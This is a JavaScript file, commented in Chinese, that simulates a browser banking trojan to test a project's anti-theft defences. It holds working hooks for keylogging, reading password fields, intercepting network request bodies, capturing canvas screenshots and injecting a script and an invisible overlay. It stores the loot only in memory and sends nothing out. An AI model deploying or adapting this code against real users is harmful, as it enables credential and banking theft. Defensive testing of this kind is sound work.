/**
 * ============================================================================
 *  模拟网银木马（仅用于本项目的防御效果验证 / 安全教学）
 * ============================================================================
 *
 *  本文件刻意模拟真实信息窃取木马(infostealer)在浏览器内的典型手段：
 *    1. hook addEventListener，记录所有键盘事件（keydown/keypress/keyup/input）
 *    2. hook document.getElementById / querySelector，记录对密码框的嗅探
 *    3. 直接读取密码类 input 的 .value
 *    4. hook fetch / XHR / sendBeacon，拦截所有出站请求体
 *    5. 定时截屏：toDataURL / toBlob / getImageData
 *    6. 注入额外 <script>、覆盖透明浮层，验证组件的 DOM/覆盖层监控
 *
 *  安全约束：
 *    - 所有"窃取"数据只存在内存数组 window.__TROJAN_LOOT__，不发往任何外部地址
 *    - 代码完全不混淆，测试台逐行展示它拿到了什么
 *    - 不做任何破坏性操作
 * ============================================================================
 */

(function () {
  'use strict';

  if (window.__TROJAN_INSTALLED__) return;
  window.__TROJAN_INSTALLED__ = true;

  const loot = {
    startedAt: new Date().toISOString(),
    keyEvents: [],          // 物理键盘记录
    inputEvents: [],        // input 事件里的值
    passwordReads: [],      // 直接读取密码框 value 的结果
    clicks: [],             // 全局点击坐标序列
    network: [],            // 拦截到的请求体
    screenshots: [],       // 截屏尝试及结果
    injectedNodes: [],      // 自己注入的东西
    notes: [],
  };
  window.__TROJAN_LOOT__ = loot;

  const MAX_SCREENSHOTS = 40;
  const KEY_EVENTS = new Set(['keydown', 'keypress', 'keyup', 'input', 'change']);

  // ---- 1. hook addEventListener：抓物理键盘事件 -----------------------------
  const origAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (type, listener, options) {
    if (KEY_EVENTS.has(String(type).toLowerCase())) {
      loot.notes.push(`[trojan] 监听到页面注册 ${type} 监听（已挂钩）`);
    }
    return origAddEventListener.call(this, type, listener, options);
  };

  // 捕获阶段全局挂键盘监听——真实木马的标配
  for (const t of ['keydown', 'keypress', 'keyup']) {
    origAddEventListener.call(
      window,
      t,
      (e) => {
        loot.keyEvents.push({
          type: e.type,
          key: e.key,
          code: e.code,
          keyCode: e.keyCode,
          target: e.target?.tagName + (e.target?.name ? `[name=${e.target.name}]` : ''),
          t: Date.now(),
        });
      },
      true,
    );
  }
  origAddEventListener.call(
    document,
    'input',
    (e) => {
      loot.inputEvents.push({
        target: e.target?.tagName + (e.target?.name ? `[name=${e.target.name}]` : ''),
        value: e.target?.value,
        t: Date.now(),
      });
    },
    true,
  );

  // ---- 2. hook DOM 查询：记录对密码框的嗅探 --------------------------------
  const origGetElementById = document.getElementById.bind(document);
  document.getElementById = function (id) {
    const el = origGetElementById(id);
    if (el && /pass|pwd|password|pin/i.test(id)) {
      loot.notes.push(`[trojan] getElementById 嗅探密码元素: #${id}`);
    }
    return el;
  };

  const origQuerySelector = document.querySelector.bind(document);
  document.querySelector = function (sel) {
    const el = origQuerySelector(sel);
    if (el && el.type === 'password') {
      loot.notes.push(`[trojan] querySelector 命中密码框: ${sel}`);
    }
    return el;
  };

  // ---- 3. 全局点击坐标序列（木马的鼠标记录）--------------------------------
  origAddEventListener.call(
    document,
    'click',
    (e) => {
      loot.clicks.push({ x: e.clientX, y: e.clientY, t: Date.now() });
    },
    true,
  );
  // 按下瞬间立刻截图——只针对软键盘 canvas，多点采样模拟持续录屏
  origAddEventListener.call(
    document,
    'pointerdown',
    (e) => {
      if (!e.target || e.target.tagName !== 'CANVAS') return;
      attemptScreenshots('pointer');
      [40, 90, 140, 200].forEach((ms) => setTimeout(() => attemptScreenshots('pointer'), ms));
    },
    true,
  );

  // ---- 4. hook 网络通道：fetch / XHR / sendBeacon ---------------------------
  const origFetch = window.fetch;
  window.fetch = async function (input, init) {
    try {
      const url = typeof input === 'string' ? input : input?.url;
      if (init?.body) {
        loot.network.push({
          channel: 'fetch',
          url: String(url),
          body: tryParse(init.body),
          t: Date.now(),
        });
      }
    } catch { /* 记录失败不影响正常请求 */ }
    return origFetch.apply(this, arguments);
  };

  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) {
    this.__trojanUrl = url;
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function (body) {
    if (body) {
      loot.network.push({
        channel: 'xhr',
        url: String(this.__trojanUrl),
        body: tryParse(body),
        t: Date.now(),
      });
    }
    return origSend.apply(this, arguments);
  };

  if (navigator.sendBeacon) {
    const origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function (url, data) {
      loot.network.push({
        channel: 'sendBeacon',
        url: String(url),
        body: tryParse(data),
        t: Date.now(),
      });
      return origBeacon(url, data);
    };
  }

  // ---- 5. 截屏：定时 + 每次点击瞬间截图（真实银行木马常见策略）--------------
  function attemptScreenshots(trigger = 'timer') {
    // 5a. 找页面上最大的 canvas（键盘就在这上面）
    const canvases = [...document.querySelectorAll('canvas')];
    const target = canvases.sort((a, b) => b.width * b.height - a.width * a.height)[0];

    if (target) {
      try {
        const url = target.toDataURL('image/png');
        loot.screenshots.push({
          api: 'toDataURL',
          trigger,
          ok: true,
          // 不存整张大图，只留指纹与前 64 字符，证明"拿到的是什么"
          dataHead: url.slice(0, 64),
          length: url.length,
          looksBlank: url.length < 2000,
          t: Date.now(),
        });
      } catch (err) {
        loot.screenshots.push({ api: 'toDataURL', trigger, ok: false, error: err.message, t: Date.now() });
      }
      try {
        target.toBlob((blob) => {
          loot.screenshots.push({
            api: 'toBlob',
            trigger,
            ok: true,
            blobSize: blob?.size ?? 0,
            looksBlank: (blob?.size ?? 0) < 1000,
            t: Date.now(),
          });
        });
      } catch (err) {
        loot.screenshots.push({ api: 'toBlob', trigger, ok: false, error: err.message, t: Date.now() });
      }
      try {
        const ctx = target.getContext('2d');
        const img = ctx.getImageData(0, 0, target.width, target.height);
        const sample = img.data.slice(0, 12);
        loot.screenshots.push({
          api: 'getImageData',
          trigger,
          ok: true,
          sample: [...sample],
          // 判断截到的是不是噪点遮罩：相邻像素差异极大
          looksLikeNoise: estimateEntropy(img.data),
          t: Date.now(),
        });
      } catch (err) {
        loot.screenshots.push({ api: 'getImageData', trigger, ok: false, error: err.message, t: Date.now() });
      }
    }
    if (loot.screenshots.length > MAX_SCREENSHOTS * 3) {
      loot.screenshots.splice(0, loot.screenshots.length - MAX_SCREENSHOTS * 3);
    }
  }
  window.__trojanScreenshotTimer = setInterval(() => attemptScreenshots('timer'), 900);

  // ---- 6. 主动注入：额外脚本标签 + 透明覆盖层 -------------------------------
  function injectPayloads() {
    const s = document.createElement('script');
    s.textContent = 'window.__TROJAN_INLINE_RAN__ = true;';
    s.dataset.trojan = 'injected';
    document.documentElement.appendChild(s);
    loot.injectedNodes.push('inline <script data-trojan=injected>');

    const overlay = document.createElement('div');
    overlay.dataset.trojan = 'overlay';
    overlay.style.cssText =
      'position:fixed;left:12px;bottom:12px;width:180px;height:60px;opacity:0.01;z-index:99999;';
    document.body?.appendChild(overlay);
    loot.injectedNodes.push('透明覆盖层 <div data-trojan=overlay>');
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', injectPayloads, { once: true });
  } else {
    injectPayloads();
  }

  // ---- 7. 定时扫描并直接偷取所有密码框的值 ----------------------------------
  window.__trojanStealTimer = setInterval(() => {
    document.querySelectorAll('input[type="password"]').forEach((el) => {
      loot.passwordReads.push({
        name: el.name || '(unnamed)',
        value: el.value,
        length: el.value?.length ?? 0,
        t: Date.now(),
      });
    });
  }, 1000);

  // ---- 工具 ----------------------------------------------------------------
  function tryParse(body) {
    if (typeof body !== 'string') return { _type: typeof body };
    try {
      return JSON.parse(body);
    } catch {
      return body.slice(0, 200);
    }
  }

  function estimateEntropy(data) {
    // 固定步长只采 R 通道（每像素 4 字节，R 在偏移 0/4/8...），
    // 避免在高 DPR 大画布上步长过大、采样点全落同色 alpha 通道而低估熵。
    // 随机噪点相邻 R 值的平均绝对差通常 > 50，正常键盘画面 < 30。
    const STEP = 4 * 40; // 每隔 40 个像素取一个 R
    let sum = 0;
    let n = 0;
    for (let i = STEP; i < data.length; i += STEP) {
      sum += Math.abs(data[i] - data[i - STEP]);
      n++;
    }
    const mad = n ? sum / n : 0;
    return mad > 40;
  }

  console.warn('%c[模拟木马] 已植入（教学演示），数据仅存于 window.__TROJAN_LOOT__', 'color:#f85149;font-weight:bold');
})();
